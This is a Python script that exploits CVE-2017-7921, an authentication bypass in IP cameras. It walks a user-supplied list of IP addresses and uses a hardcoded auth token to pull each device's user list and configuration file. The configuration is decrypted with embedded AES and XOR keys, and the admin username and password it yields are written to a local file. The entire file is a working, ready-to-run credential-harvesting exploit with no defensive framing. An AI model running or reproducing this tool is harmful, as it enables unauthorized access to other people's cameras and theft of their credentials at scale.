import re
import requests
from itertools import cycle
from Crypto.Cipher import AES


def config_decryptor(data):
    """
    vars:
      - data: binary content, such as requests.content or open('xx', 'rb')
    return:
      - (user, passwd)
    """
    def add_to_16(s):
        while len(s) % 16 != 0:
            s += b'\0'
        return s 

    def xore(data, key=bytearray([0x73, 0x8B, 0x55, 0x44])):
        return bytes(a ^ b for a, b in zip(data, cycle(key)))

    def decrypt(ciphertext, hex_key='279977f62f6cfd2d91cd75b889ce0c9a'):
        key = bytes.fromhex(hex_key)
        ciphertext = add_to_16(ciphertext)
        cipher = AES.new(key, AES.MODE_ECB)
        plaintext = cipher.decrypt(ciphertext[AES.block_size:])
        return plaintext.rstrip(b"\0")

    def strings(file):
        chars = r"A-Za-z0-9/\-:.,_$%'()[\]<> "
        shortestReturnChar = 2
        regExp = '[%s]{%d,}' % (chars, shortestReturnChar)
        pattern = re.compile(regExp)
        return pattern.findall(file)

    xor = xore(decrypt(data))
    res = strings(xor.decode('ISO-8859-1'))
    idx = -res[::-1].index('admin')
    user, passwd = res[idx - 1], res[idx]
    return user, passwd

def is_vulnerable(ip: str, port: int) -> bool:
    full_url = f"http://{ip}:{port}"
    headers = {'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}  # Default user agent
    result = cve_2017_7921(full_url, headers)
    return result[0], result[1], result[2]

def cve_2017_7921(url: str, headers: dict) -> list:
    user_url = f"{url}/Security/users?auth=YWRtaW46MTEK"
    config_url = f"{url}/System/configurationFile?auth=YWRtaW46MTEK"
    timeout = 3  # You can adjust the timeout value accordingly

    try:
        r = requests.get(user_url, timeout=timeout, verify=False, headers=headers)
        if r.status_code == 200 and 'userName' in r.text and 'priority' in r.text and 'userLevel' in r.text:
            rc = requests.get(config_url, timeout=timeout * 2, verify=False, headers=headers)
            user, passwd = config_decryptor(rc.content)
            return [True, str(user), str(passwd), 'cve-2017-7921']
    except Exception as e:
        print("error")
    return [False, "", ""]

def save_to_file(file_path, content):
    with open(file_path, "a") as file:
        file.write(content)

def main():
    # Obtener la lista de direcciones IP desde un archivo .txt
    file_path = input("Chose the ips lists(txt) : ")
    output_file_path = "vulnerable_devices.txt"

    with open(file_path, "r") as file:
        ip_list = file.read().splitlines()

    for ip in ip_list:
        ip = ip.strip()
        port = 80  # Puedes modificar el puerto seg√∫n tus necesidades

        vulnerability_status, username, password = is_vulnerable(ip, port)

        if vulnerability_status:
            output_content = f"The system {ip}:{port} is vulnerable.\n"
            output_content += f"Username: {username}\n"
            output_content += f"Password: {password}\n\n"

            print(output_content)
            save_to_file(output_file_path, output_content)
        else:
            print(f"The system {ip}:{port} is not vulnerable.")

if __name__ == "__main__":
    main()
